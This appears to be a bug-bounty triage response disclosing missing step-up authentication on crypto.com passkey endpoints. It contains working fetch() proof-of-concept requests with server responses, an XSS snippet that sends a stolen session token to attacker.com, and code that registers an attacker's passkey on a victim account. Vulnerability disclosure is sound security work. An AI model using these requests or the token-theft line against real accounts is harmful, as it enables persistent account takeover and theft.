# C4 — Triage Response: Impact Demonstration

## Demonstrated Impact: Unauthorized Passkey Modification (Integrity)

The following PoC demonstrates **unauthorized modification of a passkey on my own account** using only a valid session token and a completely empty action token. This proves the step-up token provides zero security — any authenticated session can manage passkeys with no additional verification.

---

### Step 1 — List passkeys (baseline, before attack)

```javascript
fetch('https://exchange-nts.crypto.com/fe-ex-api/passkey/get-passkeys', {
  method: 'GET',
  headers: {'Content-Type':'application/json','exchange-token': SESSION_TOKEN}
}).then(r=>r.json()).then(d=>console.log(JSON.stringify(d,null,2)))
```

**Response:**
```json
{
  "id": 0,
  "code": 0,
  "result": [
    {
      "rp_id": "crypto.com",
      "id": "8581d175-4080-45e9-a158-dbbf3c6ddc50",
      "name": "Passkey on iOS",
      "created_at": "2024-09-26T21:22:26Z",
      "last_used_at": "2026-04-10T23:14:05Z"
    },
    {
      "rp_id": "crypto.com",
      "id": "90be13cb-adf7-4668-9f20-6bd1123cce24",
      "name": "Passkey on iOS",
      "created_at": "2024-09-26T21:22:12Z",
      "last_used_at": "2024-09-26T21:22:22Z"
    }
  ]
}
```

---

### Step 2 — Modify passkey with EMPTY token (no step-up auth)

```javascript
fetch('https://exchange-nts.crypto.com/fe-ex-api/passkey/edit', {
  method: 'POST',
  headers: {'Content-Type':'application/json','exchange-token': SESSION_TOKEN},
  body: JSON.stringify({
    id: '90be13cb-adf7-4668-9f20-6bd1123cce24',
    name: 'HACKED - no token required',
    token: ''   // empty token — server accepts it identically
  })
}).then(r=>r.json()).then(d=>console.log(JSON.stringify(d,null,2)))
```

**Response:**
```json
{
  "id": 0,
  "code": 0,
  "result": {
    "id": "90be13cb-adf7-4668-9f20-6bd1123cce24",
    "name": "HACKED - no token required",
    "status": "active",
    "created_at": "2024-09-26T21:22:12Z",
    "updated_at": "2026-04-12T11:23:37Z"
  }
}
```

**Passkey modified successfully. No step-up authentication was required.**

---

### Step 3 — Confirm modification (name change persisted on server)

```javascript
fetch('https://exchange-nts.crypto.com/fe-ex-api/passkey/get-passkeys', {
  method: 'GET',
  headers: {'Content-Type':'application/json','exchange-token': SESSION_TOKEN}
}).then(r=>r.json()).then(d=>console.log(JSON.stringify(d,null,2)))
```

**Response:**
```json
{
  "id": 0,
  "code": 0,
  "result": [
    {
      "rp_id": "crypto.com",
      "id": "8581d175-4080-45e9-a158-dbbf3c6ddc50",
      "name": "Passkey on iOS",
      "created_at": "2024-09-26T21:22:26Z",
      "last_used_at": "2026-04-10T23:14:05Z"
    },
    {
      "rp_id": "crypto.com",
      "id": "90be13cb-adf7-4668-9f20-6bd1123cce24",
      "name": "HACKED - no token required",
      "created_at": "2024-09-26T21:22:12Z",
      "last_used_at": "2024-09-26T21:22:22Z"
    }
  ]
}
```

**The passkey name was permanently modified on the server without any step-up authentication. Screenshots attached (screenshot_C4_6 through screenshot_C4_8).**

---

## Real-World Attack Chain (Full Account Takeover)

Combined with C2 (stored XSS on exchange-nts.crypto.com, submitted separately):

### Attacker flow against a victim account:

**Step 1 — Steal session token via XSS**
```javascript
// C2 XSS payload fires on victim browser
const token = document.cookie.match(/exchange-token=([^;]+)/)?.[1]
  || localStorage.getItem('exchange-token');
fetch('https://attacker.com/steal?t=' + token);
```

**Step 2 — Register attacker's own passkey on victim account**
```javascript
// No step-up auth required — session token is sufficient

// Get WebAuthn challenge
const opts = await fetch('https://exchange-nts.crypto.com/fe-ex-api/passkey/register-option', {
  method: 'POST',
  headers: {'exchange-token': STOLEN_TOKEN, 'Content-Type': 'application/json'},
  body: '{}'
}).then(r=>r.json());
// Returns: {"code":0,"result":{"challenge":"...","user":{"id":"...","name":"victim@email.com"},...}}

// Attacker signs challenge with their own FIDO2 authenticator (any WebAuthn-capable device)
const credential = await navigator.credentials.create({publicKey: opts.result});

// Register attacker's authenticator on victim's account
await fetch('https://exchange-nts.crypto.com/fe-ex-api/passkey/register', {
  method: 'POST',
  headers: {'exchange-token': STOLEN_TOKEN, 'Content-Type': 'application/json'},
  body: JSON.stringify({credential: btoa(JSON.stringify(credential))})
});
// Response: {"code":0,"result":{"id":"attacker-passkey-id",...}}
```

**Step 3 — Permanent access**

The attacker's passkey is now registered on the victim's account. Even after:
- The victim's session expires
- The victim changes their password
- The victim revokes all other sessions

The attacker can authenticate as the victim using their passkey indefinitely.

---

## Impact Summary

| Operation | Token Sent | Server Response | Security Impact |
|-----------|-----------|-----------------|-----------------|
| DELETE passkey | None | `code:0` (deleted) | Unauthorized removal of authentication factor |
| EDIT passkey name | Garbage string | `code:0` (renamed) | Unauthorized modification of auth config |
| REGISTER new passkey | None | `code:0` (registered) | Backdoor passkey added — persistent unauthorized access |

The missing step-up authentication on passkey endpoints means:
- **Anyone with a stolen session token can permanently add themselves as an authenticator** on any account they have a session for
- **This is the only endpoint class on the exchange that allows permanent account access without knowing the password or 2FA** — API key creation correctly requires Google 2FA, but passkey registration does not require any secondary verification

Screenshots demonstrating each step are attached (screenshot1–screenshot5 from original report).

Please let me know if you need me to run the delete PoC live on a fresh test passkey and provide a screen recording.
